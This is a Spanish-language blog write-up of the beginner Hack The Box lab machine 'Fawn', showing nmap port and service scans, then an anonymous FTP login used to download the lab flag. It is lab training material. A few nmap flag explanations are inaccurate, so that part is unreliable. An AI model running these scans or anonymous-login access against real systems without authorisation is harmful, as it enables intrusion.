---
layout: single
title: Fawn - Hack The Box
excerpt: "Fawn es una máquina muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando FTP, un protocolo de red utilizado para la transferencia de archivos entre un cliente y un servidor."
date: 2022-10-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-fawn/fawn-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - CTFs
  - Linux
tags:  
  - ftp
  - anonymous ftp
---

![](/assets/images/htb-writeup-fawn/fawn-logo.png)

Fawn es una máquina Linux muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento y escaneos para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando `File Transfer Protocol (FTP)`, un protocolo de red utilizado para la transferencia de archivos informáticos entre un cliente y un servidor en una red.

## Reconocimiento Inicial

```
ping -c 1 10.129.205.43

PING 10.129.205.43 (10.129.205.43) 56(84) bytes of data.
64 bytes from 10.129.205.43: icmp_seq=1 ttl=63 time=44.1 ms

--- 10.129.205.43 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time Oms
rtt min/avg/max/mdev 44.102/44.102/44.102/0.000 ms
```

## Escaneo de Puertos

```
sudo nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.129.205.43 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 15:48 CEST
Initiating SYN Stealth Scan at 15:48
Scanning 10.129.205.43 [65535 ports)
Discovered open port 21/tcp on 10.129.205.43
Completed SYN Stealth Scan at 15:48, 15. 16s elapsed (65535 total ports)
Nmap scan report for 10.129.205.43
Host is up, received user-set (0.049s latency).
Scanned at 2022-08-14 15:48:15 CEST for 15s
Not shown: 63372 closed top ports (reset), 2162 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE REASON
21/tcp open ftp syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
    Raw packets sent: 76101 (3.348MB) | Rovd: 67006 (2.680MB)
```

**Escaneo inicial de puertos abiertos con Nmap**
- **-p-** Escanea todo el rango de puertos [1-65535]
- **--open** Muestro solo los puertos abiertos
- **-sS** Aplica un TCP SYN Port Scan
- **--min-rate** Indica el número de paquetes por segundo a emitir
- **-vvv** Muestra por pantalla la información descubierta durante el escaneo
- **-n** Indica que no se aplicará resolución DNS durante el escaneo 
- **-Pn** Indica que no se aplicará el protocolo ARP durante el escaneo
- **-oG** Exporta el output del escaneo a un fichero en formato grepeable

![](/assets/images/htb-writeup-fawn/allPorts.png)

```
sudo nmap -sCV -p21 10.129.205.43 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 15:51 CEST
Nmap scan report for 10.129.205.43
Host is up (0.28s latency).

PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |-rw-r--r-- 1 0 32 Jun 04 2021 flag.txt
 | ftp-syst:
 |     STAT: FTP server status:
 |     Connected to ::ffff:10.10.14.67
 |     Logged in as ftp
 |     TYPE: ASCII
 |     No session bandwidth limit
 |     Session timeout in seconds is 300
 |     Control connection is plain text
 |     Data connections will be plain text
 |     At session startup, client count was 2
 |     VSFTPd 3.0.3 - secure, fast, stable
 |_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.67 seconds
```

**Escaneo avanzado de detección de versiones y servicios con Nmap**
- **-p** Escanea los puertos especificados
- **-sV** Activa la detección de versiones y servicios
- **-sC** Lanza scripts básicos de reconocimiento y enumeración
- **-oG** Exporta el output del escaneo a un fichero en formato normal

![](/assets/images/htb-writeup-fawn/targeted.png)

## Detección de vulnerabilidades

A veces, una típica mala configuración para ejecutar servicios FTP permite que
`una cuenta anónima pueda acceder al servicio` como cualquier otro usuario autenticado. El nombre de usuario `anonymous` se puede ingresar cuando aparece el mensaje, seguido de cualquier contraseña, ya que el servicio ignorará la contraseña de esta cuenta específica.

## Explotación de vulnerabilidades

**FTP**

Procedemos a conectarnos al servicio `FTP` a través de la ip de la máquina víctima para posteriormente acceder al servicio desde la cuenta `anonymous` con cualquier contraseña.

```
ftp 10.129.205.43

Connected to 10.129.205.43.
220 (vsFTPd 3.0.3)
Name (10.129.205.43:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp>
```

Una vez dentro del servidor, podemos descargar la `flag.txt` a nuestro host local con el comando `get`, seguido del nombre del archivo que queremos descargar y el comando `exit` para salir.

```
ftp> ls

229 Entering Extended Passive Mode (|||17256|)
150 Here comes the directory listing.
-rw-r--r-      1 0       0              32 Jun 04   2021 flag.txt
226 Directory send OK.


ftp> get flag.txt

local: flag.txt remote: flag.txt
32 Jun 04 2021 flag.txt
229 Entering Extended Passive Mode (|||55124|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% **********************************************************
226 Transfer complete.
32 bytes received in 00:00 (0.67 KiB/s)

ftp> exit
```

Finalmente, si salimos del servicio FTP después de transferir la flag del servidor a nuestro host, tendremos en nuestro equipo la `flag` de HackTheBox, que es nuestro objetivo principal.

![](/assets/images/htb-writeup-fawn/flag.png)